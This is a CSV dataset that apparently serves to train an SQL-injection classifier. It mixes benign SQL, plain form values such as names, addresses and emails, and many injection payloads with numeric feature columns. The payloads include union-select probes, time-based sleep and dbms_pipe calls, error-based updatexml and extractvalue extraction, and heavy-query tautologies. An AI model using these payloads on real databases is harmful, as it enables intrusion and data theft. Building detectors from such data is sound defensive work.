,Query,no_single_qts,no_double_qts,no_punct,no_single_cmnt,no_mult_cmnt,no_space,no_perc,no_log_opt,no_arith,no_null,no_hexa,no_alpha,no_digit,len_of_chr_char_null,genuine_keywords,log_query_len,box_query_len
28212,select top 3 * from ago select * from found 3select * from mostly,0,0,3,0,0,13,0,0,3,0,0,47,2,0,3,4.174387269895637,5.762920220853171
13469,8708,0,0,0,0,0,0,0,0,0,0,0,0,4,0,0,1.3862943611198906,1.5376610839645055
21216,select * from such where fear = 'forget' limit 3,2,0,4,0,0,9,0,0,1,0,0,34,1,0,1,3.871201010907891,5.215173163969822
13648,"lealtad, 78, 6-h",0,0,3,0,0,2,0,0,1,0,0,8,3,0,0,2.772588722239781,3.4229084603450888
17961,28430,0,0,0,0,0,0,0,0,0,0,0,0,5,0,0,1.6094379124341005,1.8157827456852256
25241, update sink set fastened = 'shaking'where conversation = 'storm',4,0,6,0,0,9,0,0,0,0,0,50,0,0,0,4.174387269895637,5.762920220853171
13616,"calahorra, la",0,0,1,0,0,1,0,0,0,0,0,11,0,0,0,2.5649493574615367,3.1155015354702966
16066,1em5le28r,0,0,0,0,0,0,0,0,0,0,0,5,4,0,0,2.19722457733622,2.593591245490939
23260,select * from foot  where lion = joined,0,0,2,0,0,7,0,0,1,0,0,29,0,0,1,3.6635616461296463,4.853884482035236
6982,-7072'  )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )  ,1,0,41,0,0,56,0,8,1,0,0,66,37,7,2,5.541263545158426,8.559367492058051
174,"""  )   or true--",0,1,4,1,0,3,0,1,2,0,0,6,0,0,0,2.772588722239781,3.4229084603450888
9648,"-9718%""  )   union all select 9515,9515,9515#",0,1,7,0,0,5,1,0,1,0,0,14,16,0,1,3.80666248977032,5.101693885125393
13253,8.89e+15,0,0,2,0,0,0,0,0,1,0,0,1,5,0,0,2.079441541679836,2.432300417938136
13568,casasnova vadal,0,0,0,0,0,1,0,0,0,0,0,14,0,0,0,2.70805020110221,3.326353218260614
10081,"1""   )    )     )   rlike sleep  (  5  )  #",0,1,7,0,0,9,0,0,0,0,0,10,2,0,0,3.7612001156935615,5.022400427811018
24603,select avg ( price ) from wing,0,0,2,0,0,6,0,0,0,0,0,22,0,0,2,3.4011973816621555,4.412867051146341
2205,"1' where 8277  =  8277 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",1,0,21,1,0,26,0,1,2,0,1,38,47,0,1,5.081404364984463,7.555194009775804
29911,"  select fullid as id, whether as exercise from speech",0,0,1,0,0,9,0,0,0,0,0,43,0,0,1,3.9889840465642745,5.42506920217274
13954,"plaa del mercat, 198 7-c",0,0,2,0,0,4,0,0,1,0,0,14,4,0,0,3.1780538303479458,4.05093304771096
9033,"1""   )    )    as qrok where 8257  =  8257 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",0,1,16,1,0,24,0,1,3,0,0,42,21,0,2,4.882801922586371,7.142068971399032
26780,"  select orders.knownrid, employees.whale, employees.instead from ordersright join employees on orders.employeeid  =  employees.settlersid order by orders.houseid",0,0,9,0,0,15,0,0,0,0,0,135,0,0,3,5.087596335232384,7.56826919695837
30477,select avg ( against )  from caught  select sum ( pull ) ,0,0,4,0,0,12,0,0,0,0,0,39,0,0,4,4.04305126783455,5.522643883333643
14239,81e9604o6o,0,0,0,0,0,0,0,0,0,0,0,3,7,0,0,2.302585092994046,2.7402564225600523
25727,select * from motion order by fat desc,0,0,1,0,0,7,0,0,1,0,0,30,0,0,2,3.6375861597263857,4.809458789423759
13612,cabot@eurograb.tel,0,0,2,0,0,0,0,0,0,0,0,16,0,0,0,2.8903717578961645,3.6015010896570807
16216,3.05e+15,0,0,2,0,0,0,0,0,1,0,0,1,5,0,0,2.079441541679836,2.432300417938136
11109,"1""   )    )    as sqzh where 5672  =  5672 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",0,1,21,1,0,26,0,1,3,0,0,74,18,0,2,5.081404364984463,7.555194009775804
8048,"1"" where 5477  =  5477",0,1,2,0,0,4,0,0,0,0,0,5,9,0,0,3.091042453358316,3.9129887722739327
14718,broun_granlund@purplemoongrn.fi,0,0,3,0,0,0,0,0,0,0,0,28,0,0,0,3.4339872044851463,4.467059038127735
28560,"   select employees.in, count ( orders.shoutid )  as paidfrom    ( ordersinner join never on orders.putid  =  employees.trailid ) ",0,0,10,0,0,18,0,0,0,0,0,94,0,0,3,4.867534450455582,7.110806630787866
1370,if  (  3831  =  9321  )   select 3831 else drop function ybru--,0,0,5,1,0,11,0,0,2,0,0,28,12,0,1,4.143134726391533,5.7053230539652695
15023,apretn,0,0,0,0,0,0,0,0,0,0,0,6,0,0,0,1.791759469228055,2.0498957009511405
10181,"1'+  (  select 'suzs' where 2905  =  2905 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   +'",4,0,56,0,0,83,0,1,12,0,0,107,55,12,3,5.976350909297934,9.574027497733857
14555,feix ablitas,0,0,0,0,0,1,0,0,0,0,0,11,0,0,0,2.4849066497880004,2.999482870035824
1561,"1' or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",1,0,11,0,0,16,0,1,1,0,0,31,13,0,2,4.499809670330265,6.378649993862576
1143, or '1'   =   '1,3,0,4,0,0,4,0,1,0,0,0,2,2,0,0,2.772588722239781,3.4229084603450888
14448,cambulln,0,0,0,0,0,0,0,0,0,0,0,8,0,0,0,2.079441541679836,2.432300417938136
12409,hinson,0,0,0,0,0,0,0,0,0,0,0,6,0,0,0,1.791759469228055,2.0498957009511405
7390,1' where 4134  =  4134 and 1102  =  6300--,1,0,5,1,0,8,0,1,2,0,0,8,17,0,0,3.737669618283368,4.981567234930947
9022,1  )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     ) ,0,0,57,0,0,70,0,11,0,0,0,91,45,10,1,5.828945617610208,9.222972531070535
10002,"1%'  )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,0,16,1,0,20,1,1,3,0,0,65,8,0,2,4.820281565605037,7.014493020202725
17685,26064480y,0,0,0,0,0,0,0,0,0,0,0,1,8,0,0,2.19722457733622,2.593591245490939
20237,select * from escape where everybody = 'action' limit 3,2,0,4,0,0,9,0,0,1,0,0,41,1,0,1,4.007333185232471,5.458096843121287
29572,delete from world,0,0,0,0,0,2,0,0,0,0,0,15,0,0,0,2.833213344056216,3.514446415767603
24442,select * from discover where stems = 'church'  or pilot = 'coach',4,0,7,0,0,11,0,1,1,0,0,46,0,0,1,4.174387269895637,5.762920220853171
19269,"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 28555 )  order by meta_id asc",0,0,10,0,0,15,0,0,0,0,0,71,5,0,2,4.634728988229636,6.642694885740106
9525,"1' or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  ",1,0,22,0,0,24,0,4,0,0,0,36,16,4,0,4.787491742782046,6.948051004895869
26931,select * from  ( select operation from win ) ,0,0,3,0,0,9,0,0,1,0,0,32,0,0,2,3.80666248977032,5.101693885125393
20178,"  select city, country from customerswhere country = 'germany'union select city, country from suppliers",2,0,5,0,0,13,0,0,0,0,0,84,0,0,2,4.634728988229636,6.642694885740106
11518,neugebauer@buscamoto.gw,0,0,2,0,0,0,0,0,0,0,0,21,0,0,0,3.1354942159291497,3.983240309714999
19561,"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 262329 )  order by meta_id asc",0,0,10,0,0,15,0,0,0,0,0,71,6,0,2,4.6443908991413725,6.6618055138595045
4742,"-8128""   )    )    as ovjz where 7375  =  7375 union all select 7375,7375,7375,7375,7375,7375,7375,7375,7375--",0,1,15,1,0,12,0,0,3,0,0,25,48,0,1,4.700480365792417,6.77328459478072
16606,"calle mayor, s/n 11h",0,0,2,0,0,3,0,0,1,0,0,13,2,0,0,2.995732273553991,3.7638991627446954
3262,"1'  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  'yabn'  =  'yabn",4,0,18,0,0,24,0,2,1,0,0,75,8,0,2,4.983606621708336,7.350251518992875
12318,25g0a00,0,0,0,0,0,0,0,0,0,0,0,2,5,0,0,1.9459101490553128,2.25279015210122
7137,"-9152""   )    )    as avga where 3825  =  3825 order by 1#",0,1,6,0,0,11,0,0,1,0,0,18,13,0,1,4.060443010546419,5.554195840989334
2038,"-4641""  )   where 4212  =  4212 or make_set  (  3595  =  4062,4062  )  --",0,1,11,1,0,13,0,1,3,0,0,14,24,0,0,4.290459441148391,5.97916802637938
1927,"-9845""  )   as xpis where 1936  =  1936 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",0,1,24,0,0,46,0,1,2,0,0,74,45,0,1,5.455321115357702,8.366504885315885
11590,zangn,0,0,0,0,0,0,0,0,0,0,0,5,0,0,0,1.6094379124341005,1.8157827456852256
21546,select avg ( unusual ) from drink select sum ( guess ) ,0,0,4,0,0,12,0,0,0,0,0,39,0,0,4,4.007333185232471,5.458096843121287
4589, (  select   (  case when   (  7018  =  7018  )   then 7018 else 7018*  (  select 7018 from master..sysdatabases  )   end   )    ) ,0,0,12,0,0,24,0,0,1,0,0,53,20,0,2,4.875197323201151,7.1264886919277375
28726,select * from thrown where advice between 'chest' and 'uncle',4,0,5,0,0,9,0,1,1,0,0,47,0,0,1,4.110873864173311,5.646144513813471
2688,"1'   )    )    and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   'vcph'  =  'vcph",4,0,30,0,0,38,0,2,1,0,1,55,32,0,3,5.375278407684165,8.189060138501123
3276,"1%"" and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ""%""  =  """,2,4,20,0,0,20,2,2,1,0,0,35,15,0,0,4.770684624465665,6.914118695344334
3900,"1%""   )    )     )   or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (     (  ""%""  =  """,0,4,19,0,0,20,2,2,0,0,0,13,10,0,0,4.605170185988092,6.584397772472616
12256,00903443a,0,0,0,0,0,0,0,0,0,0,0,1,8,0,0,2.19722457733622,2.593591245490939
24761,select top 50 percent * from dirt,0,0,1,0,0,6,0,0,1,0,0,24,2,0,2,3.49650756146648,4.571113592379885
3882,1  )   as jvmv where 3857  =  3857 and   (  5717  =  6483  )  *6483--,0,0,8,1,0,14,0,1,3,0,0,14,21,0,0,4.23410650459726,5.873719016140452
13185,bollullos par del condado,0,0,0,0,0,3,0,0,0,0,0,22,0,0,0,3.218875824868201,4.116261188933881
23483,select * from lungs where advice = 'egg' limit 3,2,0,4,0,0,9,0,0,1,0,0,34,1,0,1,3.871201010907891,5.215173163969822
6836,1%'  )   union all select null--,1,0,5,1,0,5,1,0,2,1,0,18,1,1,1,3.4657359027997265,4.519779854678687
5301,"1%""   )    )    and 6283  =  2068 and    (    (   ""%""  =  """,0,4,12,0,0,12,2,2,0,0,0,6,9,0,0,4.07753744390572,5.5852871348767055
25636, update rubber set instead = 'brain'where spite = 'coach',4,0,6,0,0,9,0,0,0,0,0,42,0,0,0,4.04305126783455,5.522643883333643
25161,select top 3 * from enter select * from social 3select * from water,0,0,3,0,0,13,0,0,3,0,0,49,2,0,3,4.204692619390966,5.819025031871101
27373,select save ( s )  from fairly union all,0,0,2,0,0,8,0,0,0,0,0,29,0,0,1,3.688879454113936,4.897348914472564
27137,select avg ( ice ) from universe,0,0,2,0,0,6,0,0,0,0,0,24,0,0,2,3.4657359027997265,4.519779854678687
16721,bossa,0,0,0,0,0,0,0,0,0,0,0,5,0,0,0,1.6094379124341005,1.8157827456852256
25177,select * from broke where consider not like 'electricity%',2,0,4,0,0,8,1,1,1,0,0,46,0,0,1,4.060443010546419,5.554195840989334
3350,1  )   as hhly where 2906  =  2906,0,0,2,0,0,7,0,0,0,0,0,11,9,0,0,3.5263605246161616,4.621137163019105
6379,"1   )    )    as wmxa where 6485  =  6485 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",2,0,18,1,0,25,0,1,3,0,0,43,23,0,0,4.969813299576001,7.321582942195207
303," select * from users where id  =  1 union select @ 1$,version  (    )   -- 1",0,0,9,1,0,16,0,0,3,0,0,40,3,0,2,4.330733340286331,6.055066595411042
17427,kindra,0,0,0,0,0,0,0,0,0,0,0,6,0,0,0,1.791759469228055,2.0498957009511405
23425,"  select besideid as id, joined as paint from globe",0,0,1,0,0,9,0,0,0,0,0,40,0,0,1,3.9318256327243257,5.322755734775789
1668,"1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#",1,0,9,0,0,9,0,0,0,6,0,43,9,6,1,4.31748811353631,6.030055566276218
17813,sadoyama,0,0,0,0,0,0,0,0,0,0,0,8,0,0,0,2.079441541679836,2.432300417938136
24587,select * from salt where center not like 'breath%',2,0,4,0,0,8,1,1,1,0,0,38,0,0,1,3.912023005428146,5.287509109454676
24696,select * from announced where price not between 'grass' and 'nose',4,0,5,0,0,10,0,2,1,0,0,51,0,0,1,4.189654742026425,5.791153910047609
18790,tordera savall,0,0,0,0,0,1,0,0,0,0,0,13,0,0,0,2.6390573296152584,3.2241419783899143
9305,"-1707  )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +cha",0,0,33,0,0,54,0,1,7,0,0,74,35,7,2,5.541263545158426,8.559367492058051
12647,calle tras do colexio s/n,0,0,1,0,0,4,0,0,1,0,0,20,0,0,0,3.218875824868201,4.116261188933881
17656,4377,0,0,0,0,0,0,0,0,0,0,0,0,4,0,0,1.3862943611198906,1.5376610839645055
12987,zapateo,0,0,0,0,0,0,0,0,0,0,0,7,0,0,0,1.9459101490553128,2.25279015210122
15970,bardischewski9@sexotelefono.rw,0,0,2,0,0,0,0,0,0,0,0,27,1,0,0,3.4011973816621555,4.412867051146341
21056,select * from body where completely between '1996-07-01' and '1996-07-31',4,0,9,0,0,9,0,1,5,0,0,39,16,0,1,4.290459441148391,5.97916802637938
27325,select top 3 * from skill select * from reach 3select * from sudden,0,0,3,0,0,13,0,0,3,0,0,49,2,0,3,4.204692619390966,5.819025031871101
26514,select * from go order by sharp desc,0,0,1,0,0,7,0,0,1,0,0,28,0,0,2,3.58351893845611,4.717530264472627
11727,katy,0,0,0,0,0,0,0,0,0,0,0,4,0,0,0,1.3862943611198906,1.5376610839645055
2959,"1%' and elt  (  4249  =  4249,7259  )   and '%'  =  '",4,0,11,0,0,11,2,2,0,0,0,9,13,0,0,3.970291913552122,5.391515666300752
18406,desacertadamente,0,0,0,0,0,0,0,0,0,0,0,16,0,0,0,2.772588722239781,3.4229084603450888
28610,select top 3 * from appropriate where active = 'series' select * from event,2,0,5,0,0,13,0,0,2,0,0,56,1,0,3,4.31748811353631,6.030055566276218
26991,select distinct cannot from feature,0,0,0,0,0,4,0,0,0,0,0,31,0,0,1,3.555348061489413,4.669921102482963
26097,select slipped from drove union select alone from name order by planning,0,0,0,0,0,11,0,0,0,0,0,61,0,0,3,4.276666119016055,5.953276820822519
10689,"-5763'   )    )     )   union all select 1640,1640,1640,1640,1640,1640,1640,1640,1640,1640#",1,0,15,0,0,7,0,0,1,0,0,14,44,0,1,4.51085950651685,6.400078810527845
16701,pembrooke_coates@stainless.gd,0,0,3,0,0,0,0,0,0,0,0,26,0,0,0,3.367295829986474,4.357111686472804
3478,"1""   )    )    and make_set  (  8266  =  9226,9226  )   and    (    (   ""omjx"" like ""omjx",0,4,13,0,0,15,0,2,0,0,0,25,13,0,0,4.48863636973214,6.357017110069445
19313,"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 13506 )  order by meta_id asc",0,0,10,0,0,15,0,0,0,0,0,71,5,0,2,4.634728988229636,6.642694885740106
24177,select top 3 * from within select * from soil 3select * from white,0,0,3,0,0,13,0,0,3,0,0,48,2,0,3,4.189654742026425,5.791153910047609
21578,select count ( * )  as completely,0,0,3,0,0,6,0,0,1,0,0,23,0,0,2,3.49650756146648,4.571113592379885
29828,select spirit ( s )  from usually select college from father,0,0,2,0,0,10,0,0,0,0,0,47,0,0,2,4.0943445622221,5.615932130190505
1072,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual  )  ||'",1,0,24,0,0,24,0,4,0,0,0,48,10,4,1,4.859812404361672,7.095021332406797
28831,select count ( cross )  from grabbed,0,0,2,0,0,6,0,0,0,0,0,27,0,0,2,3.58351893845611,4.717530264472627
6492,"-5165'   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    ",1,0,33,0,0,54,0,1,6,0,0,71,35,7,2,5.541263545158426,8.559367492058051
10506,"1"" where 7249  =  7249 union all select null,null,null,null,null,null,null,null,null,null--",0,1,13,1,0,8,0,0,2,10,0,59,9,10,1,4.51085950651685,6.400078810527845
13020,rutledge,0,0,0,0,0,0,0,0,0,0,0,8,0,0,0,2.079441541679836,2.432300417938136
27483,select count ( distinct stand )  from parent,0,0,2,0,0,7,0,0,0,0,0,34,0,0,2,3.784189633918261,5.062431490914847
10649,"1' or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and 'kjfm'  =  'kjfm",4,0,21,0,0,24,0,2,0,0,1,47,35,0,1,5.075173815233827,7.542049364654595
30223,"  select asleep,hat from vast where typical = 'his' union select using, whenever from meal",2,0,5,0,0,14,0,0,0,0,0,70,0,0,2,4.499809670330265,6.378649993862576
19513,select * from wp_posts where id  =  28694 limit 1,0,0,3,0,0,9,0,0,1,0,0,29,6,0,1,3.8918202981106265,5.251655965920898
7603,"1'  )   as hlbq where 2347  =  2347 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1,0,60,1,0,77,0,11,2,0,0,92,57,10,1,5.8944028342648505,9.377924386066995
19354,select option_value from wp_options where option_name  =  '_options_linkedin_url' limit 1,2,0,9,0,0,9,0,0,0,0,0,68,1,0,1,4.48863636973214,6.357017110069445
7210,"1'+  (  select eztr where 4260  =  4260 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5   )    )   +'",2,0,28,0,0,32,0,4,2,0,0,52,24,4,1,5.117993812416755,7.632630520274673
29682,select * from  ( select trade from package ) ,0,0,3,0,0,9,0,0,1,0,0,32,0,0,2,3.80666248977032,5.101693885125393
1576,select   (  case when   (  1499  =  4923  )   then 1499 else 1/  (  select 0  )   end  )  --,0,0,10,1,0,19,0,0,3,0,0,31,14,0,2,4.5217885770490405,6.42130769614405
71," select * from users where id  =  1 or "",."" or 1  =  1 -- 1",0,2,9,1,0,16,0,2,3,0,0,26,4,0,1,4.07753744390572,5.5852871348767055
3427,"-7255' union all select 2127,2127,2127,2127,2127#",1,0,7,0,0,4,0,0,1,0,0,14,24,0,1,3.8918202981106265,5.251655965920898
19105,60578448j,0,0,0,0,0,0,0,0,0,0,0,1,8,0,0,2.19722457733622,2.593591245490939
15929,cusell vinageras,0,0,0,0,0,1,0,0,0,0,0,15,0,0,0,2.772588722239781,3.4229084603450888
666," select * from users where id  =  1 + @<1# union select 1,version  (    )   -- 1",0,0,11,1,0,17,0,0,4,0,0,40,4,0,2,4.382026634673881,6.152384767567401
19722,"select productname, unitprice *  ( unitsinstock + coalesce ( unitsonorder, 0  )  )   from products;",0,0,9,0,0,14,0,0,2,0,0,70,1,0,1,4.59511985013459,6.564633716663423
7598,1  )   where 9078  =  9078 rlike sleep  (  5  )  #,0,0,5,0,0,11,0,0,0,0,0,15,10,0,0,3.912023005428146,5.287509109454676
26564,"select * from spend where full between ""discovery"" and    ""brought""",0,4,5,0,0,9,0,1,1,0,0,50,0,0,1,4.204692619390966,5.819025031871101
10858,-3520%' or 8571  =  8571--,1,0,6,1,0,4,1,1,3,0,0,2,12,0,0,3.258096538021482,4.179397132269193
5264,"1"" union all select null--",0,1,3,1,0,4,0,0,2,1,0,18,1,1,1,3.258096538021482,4.179397132269193
17957,17751,0,0,0,0,0,0,0,0,0,0,0,0,5,0,0,1.6094379124341005,1.8157827456852256
30184,select count ( wise ) from draw,0,0,2,0,0,6,0,0,0,0,0,23,0,0,2,3.4339872044851463,4.467059038127735
21104,"  update they set or =  'golden', city =  'path' where us =  onto",4,0,8,0,0,13,0,1,0,0,0,40,0,0,0,4.174387269895637,5.762920220853171
24212,"  select differenceid as id, gather as late from chair",0,0,1,0,0,9,0,0,0,0,0,43,0,0,1,3.9889840465642745,5.42506920217274
13394,aristteles,0,0,0,0,0,0,0,0,0,0,0,10,0,0,0,2.302585092994046,2.7402564225600523
18249,c/ calzada 169,0,0,1,0,0,2,0,0,1,0,0,8,3,0,0,2.6390573296152584,3.2241419783899143
22297,select top 3 * from organized,0,0,1,0,0,5,0,0,1,0,0,22,1,0,2,3.367295829986474,4.357111686472804
11510,pontevedra,0,0,0,0,0,0,0,0,0,0,0,10,0,0,0,2.302585092994046,2.7402564225600523
26004,select * from fell fetch first 50 percent rows only,0,0,1,0,0,9,0,0,1,0,0,39,2,0,3,3.9318256327243257,5.322755734775789
10547,"1'  )   union all select null,null,null,null,null,null,null#",1,0,9,0,0,5,0,0,0,7,0,42,1,7,1,4.0943445622221,5.615932130190505
16922,04492457m,0,0,0,0,0,0,0,0,0,0,0,1,8,0,0,2.19722457733622,2.593591245490939
8269,-3938%'   )    )     )   or 2034  =  7209#,1,0,8,0,0,7,1,1,1,0,0,2,12,0,0,3.737669618283368,4.981567234930947
8061,-2784  )   where 5261  =  5261 or 3472  =  1728#,0,0,5,0,0,9,0,1,1,0,0,7,20,0,0,3.871201010907891,5.215173163969822
17929,36930027p,0,0,0,0,0,0,0,0,0,0,0,1,8,0,0,2.19722457733622,2.593591245490939
11983,maryrose,0,0,0,0,0,0,0,0,0,0,0,8,0,0,0,2.079441541679836,2.432300417938136
28321,select avg ( decide ) from recently select sum ( classroom ) ,0,0,4,0,0,12,0,0,0,0,0,45,0,0,4,4.110873864173311,5.646144513813471
8438,"-4993"" union all select 6959,6959,6959--",0,1,6,1,0,4,0,0,3,0,0,14,16,0,1,3.688879454113936,4.897348914472564
21492,select * from globe order by palace desc,0,0,1,0,0,7,0,0,1,0,0,32,0,0,2,3.688879454113936,4.897348914472564
22734,select count ( darknessid ) from nodded,0,0,2,0,0,6,0,0,0,0,0,31,0,0,2,3.6635616461296463,4.853884482035236
11959,hirn,0,0,0,0,0,0,0,0,0,0,0,4,0,0,0,1.3862943611198906,1.5376610839645055
16396,29056,0,0,0,0,0,0,0,0,0,0,0,0,5,0,0,1.6094379124341005,1.8157827456852256
8408,"-7083 union all select 7705,7705,7705,7705,7705#",0,0,6,0,0,4,0,0,1,0,0,14,24,0,1,3.871201010907891,5.215173163969822
13713,flavio,0,0,0,0,0,0,0,0,0,0,0,6,0,0,0,1.791759469228055,2.0498957009511405
29311,"  select * from outside where nervous in  ( 'aware', 'cut', 'all' )  ",6,0,11,0,0,13,0,0,1,0,0,42,0,0,1,4.23410650459726,5.873719016140452
27395,select * from running where    not rocky = 'involved',2,0,4,0,0,8,0,1,1,0,0,38,0,0,1,3.970291913552122,5.391515666300752
27506,select * from chapter,0,0,1,0,0,3,0,0,1,0,0,17,0,0,1,3.044522437723423,3.839958531231341
25493,"   select duck, nearby+ ', ' + quiet+ ' ' + wing+ ', ' + vessels as engineer  from wherever",6,0,15,0,0,19,0,0,6,0,0,54,0,0,1,4.51085950651685,6.400078810527845
16864,d9s1a1i89,0,0,0,0,0,0,0,0,0,0,0,4,5,0,0,2.19722457733622,2.593591245490939
23653,select * from board where cloth = 'selection'  and city = 'add',4,0,7,0,0,11,0,1,1,0,0,44,0,0,1,4.143134726391533,5.7053230539652695
15904,rattray@elgrancolisionadordehadrones.gl,0,0,2,0,0,0,0,0,0,0,0,37,0,0,0,3.6635616461296463,4.853884482035236
2997,1  )   where 7552  =  7552 order by 1#,0,0,3,0,0,8,0,0,0,0,0,12,10,0,1,3.6375861597263857,4.809458789423759
8947,"-4093'   )    )    union all select 5785,5785,5785#",1,0,7,0,0,6,0,0,1,0,0,14,16,0,1,3.9318256327243257,5.322755734775789
1710,"1'||  (  select 'svgd' from dual where 5188  =  5188 union all select null,null,null,null,null#",3,0,12,0,0,13,0,1,0,5,0,57,9,5,2,4.553876891600541,6.483834243658689
23995,select avg ( train ) from park,0,0,2,0,0,6,0,0,0,0,0,22,0,0,2,3.4011973816621555,4.412867051146341
18351,camio canexa 161 11?g,0,0,1,0,0,3,0,0,0,0,0,12,5,0,0,3.044522437723423,3.839958531231341
14315,song@eyewear.nom.aw,0,0,3,0,0,0,0,0,0,0,0,16,0,0,0,2.9444389791664403,3.684523708911846
30406,select hand ( s )  from mine left join,0,0,2,0,0,8,0,0,0,0,0,27,0,0,2,3.6375861597263857,4.809458789423759
17991,sau nobrega,0,0,0,0,0,1,0,0,0,0,0,10,0,0,0,2.3978952727983707,2.8749024412290907
23826,"  select orders.tearsrid, employees.bus, employees.skin from ordersright join employees on orders.employeeid  =  employees.promisedid order by orders.lookid",0,0,9,0,0,15,0,0,0,0,0,129,0,0,3,5.049856007249537,7.48875985367401
15672,banerjee6@getgold.ec,0,0,2,0,0,0,0,0,0,0,0,17,1,0,0,2.995732273553991,3.7638991627446954
24348,select * from tax where not move = 'probably'  and not neck = 'strange',4,0,7,0,0,13,0,2,1,0,0,50,0,0,1,4.262679877041316,5.927077040928176
3036,"1' where 4149  =  4149 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",3,0,17,1,0,21,0,1,3,0,0,37,23,0,0,4.8283137373023015,7.030817503794459
26234,select * from flat 3,0,0,1,0,0,4,0,0,1,0,0,14,1,0,1,2.995732273553991,3.7638991627446954
15900,540,0,0,0,0,0,0,0,0,0,0,0,0,3,0,0,1.0986122886681098,1.19230319601282
